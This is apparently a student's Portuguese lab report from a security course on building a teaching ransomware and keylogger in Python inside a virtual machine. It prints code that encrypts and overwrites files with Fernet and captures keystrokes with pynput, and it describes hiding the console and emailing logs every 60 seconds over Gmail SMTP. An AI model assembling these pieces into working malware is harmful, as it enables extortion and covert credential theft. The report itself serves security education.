Relatório de Laboratório: Desenvolvimento de Ferramentas de Malware Educacional
Aluno: Ary Prestes
Curso: Dio Santander Open Academy
Data: 31 de Outubro de 2025

1. Introdução
Este relatório resume as atividades práticas realizadas em aula, com foco no 
desenvolvimento de duas ferramentas educacionais de malware: um ransomware e um
keylogger. O objetivo foi compreender os mecanismos de criptografia, captura de 
dados e exfiltração de informações, sempre em um ambiente isolado e controlado 
para fins didáticos e de conscientização em cibersegurança. Todas as implementações 
foram realizadas em Python, destacando a importância de práticas seguras e éticas 
no estudo de ameaças cibernéticas.

2. Objetivos

Criar e testar um ransomware que criptografa arquivos sensíveis.
Desenvolver um keylogger para captura de entrada de teclado.
Integrar o keylogger com envio automático de dados via e-mail.
Demonstrar técnicas de execução em segundo plano e descriptografia.

3. Ambiente de Execução

Máquina Virtual: Windows 10 no VirtualBox (ambiente isolado para evitar riscos reais).
Editor de Código: Visual Studio Code.
Linguagem: Python 3.x com bibliotecas instaladas:

Biblioteca,Finalidade
cryptography,Criptografia (Fernet)
pynput,Captura de teclado
smtplib,Envio de e-mails
email.mime.text,Formatação de mensagens
threading,Agendamento de tarefas

4. Desenvolvimento e Procedimentos
4.1. Preparação do Ambiente de Teste

Criei uma pasta chamada malware dentro da VM.
Dentro dela, gerei dois arquivos de teste:

senhas.txt: Contendo senhas fictícias.
dados_confidenciais.txt: Contendo dados sensíveis simulados.



4.2. Implementação do Ransomware

Criptografia:

Utilizei o algoritmo Fernet (simétrico, da biblioteca cryptography).
Script principal: Gera uma chave de criptografia, criptografa os arquivos e os sobrescreve.
Exemplo de código chave:
pythonfrom cryptography.fernet import Fernet

chave = Fernet.generate_key()  # Salvar em arquivo seguro
f = Fernet(chave)
with open("senhas.txt", "rb") as file:
    dados = file.read()
dados_criptografados = f.encrypt(dados)
with open("senhas.txt", "wb") as file:
    file.write(dados_criptografados)

Resultado: Arquivos tornados inlegíveis (binários criptografados).


Descriptografia:

Script separado carrega a chave e reverte o processo.
Exemplo:
pythondef descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

Teste: Arquivos restaurados 100% com sucesso.



4.3. Implementação do Keylogger

Captura de Teclas:

Biblioteca pynput.keyboard para monitorar pressionamentos.
Registra letras, números, espaços (" "), enters ("\n") e backspace ("[").
Ignora teclas de controle (Shift, Ctrl, etc.).
Exemplo de função on_press:
pythondef on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "["



Armazenamento:

Salva em log.txt (append mode, UTF-8).


Execução em Segundo Plano:

Renomeado para .pyw (oculta console no Windows).
Inicia listener: keyboard.Listener(on_press=on_press).join().



4.4. Exfiltração de Dados via E-mail

Configuração SMTP Gmail:

Parâmetro,Valor
Servidor,smtp.gmail.com:587
Segurança,starttls()
E-mail Origem,meuemailquenaoquerocitar@gmail.com
Senha App,[Gerada no Google]


Envio Automático:

Usa threading.Timer para enviar a cada 60 segundos.
Função enviar_email(): Formata log como MIMEText e envia.
Exemplo:
pythonTimer(60, enviar_email).start()


Teste: Logs enviados com sucesso para conta de destino.

5. Resultados e Observações

Componente,Status,Observações
Ransomware,✅ Sucesso,Criptografia/Descriptografia OK
Keylogger,✅ Sucesso,Captura precisa; roda oculto
Envio E-mail,✅ Sucesso,Periódico e automático
Lições Aprendidas:

Facilidade de implementação de malwares em Python.
Importância de ambientes isolados (VM).
Medidas de defesa: Antivírus, senhas de app Gmail, backups.


6. Conclusão
As aulas proporcionaram uma compreensão prática e hands-on de ameaças cibernéticas, 
reforçando a necessidade de educação em segurança da informação. Recomendo expandir 
para detecção via EDR ou análise reversa. Arquivos e códigos completos disponíveis 
na pasta malware da VM.
Assinatura:

Anexos Sugeridos:

Screenshots dos arquivos criptografados/restaurados.
log.txt de teste.
Scripts completos (.py / .pyw).

Obrigada pela oportunidade de aprendizado! 😊